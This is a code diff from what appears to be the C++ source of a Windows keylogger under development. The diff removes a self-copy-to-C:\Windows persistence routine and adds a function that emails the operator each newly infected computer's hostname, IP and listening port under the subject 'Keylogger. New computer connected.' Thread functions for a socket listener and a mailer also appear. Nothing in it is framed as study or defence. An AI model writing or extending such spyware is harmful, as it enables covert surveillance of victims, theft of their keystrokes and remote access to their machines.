@@ -38,6 +38,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 	WPARAM wParam, LPARAM lParam);
 void socketThreadProc();
 void mailerThreadProc();
+void sendFirstEmail();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
@@ -47,27 +48,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	//_setmode(_fileno(stdout), _O_U8TEXT);
 	freopen("CONOUT$", "w", stderr);
 
-	// Check if the first run on this computer
-	const int buffSize = 1024;
-	wchar_t buff[1024];
-	GetModuleFileName(NULL, buff, buffSize);
-	std::wstring path = std::wstring(buff);
-	GetWindowsDirectory(buff, buffSize);
-	std::wstring winDir = L"C:\\Windows";
-	if (path.find(winDir) != 0) {
-		// Copy self to windir
-		std::wstring newPath = winDir + L"\\" + PROGRAM_NAME;
-		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
-		if (result) {
-			std::cout << "copied";
-		} else {
-			std::cout << "err";
-		}
-
-		system(StringUtilities::ws2s(newPath).c_str());
-		// TODO add copied exe to autorun
-		ExitProcess(0);
-	}
+	// Only in first launch
+	sendFirstEmail();
 
 	MSG msg;
 	WNDCLASS wndClass;
@@ -131,4 +113,15 @@ void mailerThreadProc() {
 			}
 		}
 	}
+}
+
+void sendFirstEmail() {
+	auto emailService = make_shared<EmailService>();
+	auto subject = L"Keylogger. New computer connected.";
+	std::wstringstream bodyStream;
+	bodyStream << ComputerInfoHelper::getInstance()->getHostName() << " connected" << std::endl;
+	bodyStream << "To connect use this string:" << std::endl;
+	bodyStream << "connect " << ComputerInfoHelper::getInstance()->getIp() << " " <<
+		ComputerInfoHelper::getInstance()->getPort();
+	emailService->sendEmail(subject, bodyStream.str(), L"");
 }
